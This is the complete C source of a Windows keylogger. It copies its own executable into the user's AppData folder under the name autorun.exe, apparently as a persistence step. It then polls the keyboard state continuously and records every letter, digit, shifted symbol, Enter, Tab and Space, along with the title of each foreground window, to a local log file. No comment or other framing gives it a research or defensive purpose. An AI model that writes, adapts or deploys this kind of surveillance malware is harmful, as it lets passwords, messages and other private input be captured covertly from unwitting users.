#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <tchar.h>
#define LIMIT 255


int main(int argc, CHAR* argv[]) {
	HANDLE HDCurrentForeGroundWD;
	HANDLE HDPreviousForeGroundWD;
	HANDLE HLogfile;
	DWORD DwNumberOfBytestoWrite;
	TCHAR Buffer;
	TCHAR ChWindowsText[LIMIT];
	TCHAR VkSpecialArray[] = { ')','!','@','#','$','%','^','&','*','(' };
	TCHAR VkOtherSpecialArray[] = { ':','+','<','_','>','?','~' };
	TCHAR VkOtherSpecialArray1[] = { '{','|','}','"', };
	int VKCode;
	TCHAR* Filename = L"Logfile.dat";
	TCHAR* Appdata = L"%appdata%";
	TCHAR AppdataFilename[LIMIT];
	TCHAR CurrentFileName[LIMIT];
	GetModuleFileName(NULL, CurrentFileName, LIMIT);
	ExpandEnvironmentStrings(Appdata, AppdataFilename, LIMIT);
	_tcscat_s(AppdataFilename,LIMIT, L"\\autorun.exe");
	printf("Appdata File name: %ws\n", AppdataFilename);
	printf("Current Filename: %ws\n", CurrentFileName);
	CopyFile(CurrentFileName, AppdataFilename,TRUE);
	HLogfile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == HLogfile) {
		printf("Could not Create File. Error Code: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	HDCurrentForeGroundWD = GetForegroundWindow();
	HDPreviousForeGroundWD = HDCurrentForeGroundWD;
	GetWindowText(HDCurrentForeGroundWD, ChWindowsText, LIMIT);
	printf("%ws\n", ChWindowsText);
	if (!WriteFile(HLogfile, ChWindowsText, _tcslen(ChWindowsText), &DwNumberOfBytestoWrite, NULL)) {
		printf("Could not write to file!\n");
		CloseHandle(HLogfile);
		exit(EXIT_FAILURE);
	}
	while (TRUE) {
		HDCurrentForeGroundWD = GetForegroundWindow();
		if (HDPreviousForeGroundWD != HDCurrentForeGroundWD) {
			HDPreviousForeGroundWD = HDCurrentForeGroundWD;
			GetWindowText(HDCurrentForeGroundWD, ChWindowsText, LIMIT);
			printf("%ws\n", ChWindowsText);
			if (!WriteFile(HLogfile, ChWindowsText, _tcslen(ChWindowsText), &DwNumberOfBytestoWrite, NULL)) {
				printf("Could not write to file1!\n");
				CloseHandle(HLogfile);
				exit(EXIT_FAILURE);
			}
		}
		//For Number Key and SHIFT
		for (VKCode = 0x30; VKCode <= 0x39; VKCode++) {
			if (GetAsyncKeyState(VKCode) & 0x1) {
				if (GetKeyState(VK_SHIFT) & 0x8000) {
					// SHIFT is pressed
					printf("%c", VkSpecialArray[(VKCode - 0x30)]);
					if (!WriteFile(HLogfile, &VkSpecialArray[(VKCode - 0x30)], sizeof(VkSpecialArray[0]), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file2!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
				else {
					printf("%c", MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR));
					Buffer = (TCHAR)MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR);
					if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file3!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
			}
		}
		// For other Special Character
		for (VKCode = 0xBA; VKCode <= 0xC0; VKCode++) {
			if (GetAsyncKeyState(VKCode) & 0x1) {
				if (GetKeyState(VK_SHIFT) & 0x8000) {
					//SHIFT is pressed
					printf("%c", VkOtherSpecialArray[(VKCode - 0xBA)]);
					if (!WriteFile(HLogfile, &VkOtherSpecialArray[(VKCode - 0xBA)], sizeof(VkOtherSpecialArray[0]), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file4!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
				else {
					printf("%c", MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR));
					Buffer = (TCHAR)MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR);
					if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file5!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
			}
		}
		// For other Special Character
		for (VKCode = 0xDB; VKCode <= 0xDE; VKCode++) {
			if (GetAsyncKeyState(VKCode) & 0x1) {
				if (GetKeyState(VK_SHIFT) & 0x8000) {
					//SHIFT is pressed
					printf("%c", VkOtherSpecialArray1[(VKCode - 0xDB)]);
					if (!WriteFile(HLogfile, &VkOtherSpecialArray1[(VKCode - 0xDB)], sizeof(VkOtherSpecialArray1[0]), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file6!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
				else {
					printf("%c", MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR));
					Buffer = (TCHAR)MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR);
					if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file7!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
			}
		}

		// For Normal Character

		for (VKCode = 0x41; VKCode <= 0x5A; VKCode++) {
			if (GetAsyncKeyState(VKCode) & 0x1) {
				if ((GetKeyState(VK_SHIFT) & 0x8000) ^ (GetKeyState(VK_CAPITAL) & 0x1)) {
					//SHIFT or CAPLOCK is pressed
					printf("%c", MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR));
					Buffer = (TCHAR)MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR);
					if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file8!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
				else {
					printf("%c", tolower(MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR)));
					Buffer = (TCHAR)tolower(MapVirtualKey(VKCode, MAPVK_VK_TO_CHAR));
					if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
						printf("Could not write to file9!\n");
						CloseHandle(HLogfile);
						exit(EXIT_FAILURE);
					}
				}
			}
		}
		// For Enter Key
		if (GetAsyncKeyState(VK_RETURN) & 0x1) {
			printf("\n");
			Buffer = '\n';
			if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
				printf("Could not write to fileA!\n");
				CloseHandle(HLogfile);
				exit(EXIT_FAILURE);
			}
		}
		// For Tab Key
		if (GetAsyncKeyState(VK_TAB) & 0x1) {
			printf("\t");
			Buffer = '\t';
			if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
				printf("Could not write to fileB!\n");
				CloseHandle(HLogfile);
				exit(EXIT_FAILURE);
			}
		}
		if (GetAsyncKeyState(VK_SPACE) & 0x1) {
			printf(" ");
			Buffer = ' ';
			if (!WriteFile(HLogfile, &Buffer, sizeof(Buffer), &DwNumberOfBytestoWrite, NULL)) {
				printf("Could not write to fileC!\n");
				CloseHandle(HLogfile);
				exit(EXIT_FAILURE);
			}
		}
	}
	return 0;
}